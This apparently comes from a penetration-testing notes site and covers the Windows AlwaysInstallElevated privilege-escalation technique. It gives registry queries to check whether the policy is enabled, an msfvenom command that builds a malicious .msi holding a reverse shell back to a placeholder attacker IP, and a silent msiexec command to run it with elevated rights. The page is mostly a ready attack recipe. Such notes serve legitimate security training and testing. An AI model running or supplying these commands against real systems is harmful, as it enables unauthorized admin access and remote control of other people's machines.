---
sidebar_position: 5
---

# AlwaysInstallElevated

**Windows Installer Files** <b style={{ color: 'Plum' }}>[.msi]</b> are used to Install Applications on the System <span style={{fontWeight: 'Bold'}}>(They Usually run with the Privilege Level of the User that Start them).</span>

However, they can be Configured to run with Higher Privileges from any User Account <span style={{fontWeight: 'Bold'}}>(Even Unprivileged Ones).</span> We can Potentially generate a Malicious <b style={{ color: 'Plum' }}>[.msi]</b> File that would run with Admin Privileges.

---

<br/>

- This method Requires Two <b style={{ color: 'DeepSkyBlue' }}>Registry</b> Values to be set.

```log
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

- **PAYLOAD**

```js
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
```

- Running the **PAYLOAD**

```batch
C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```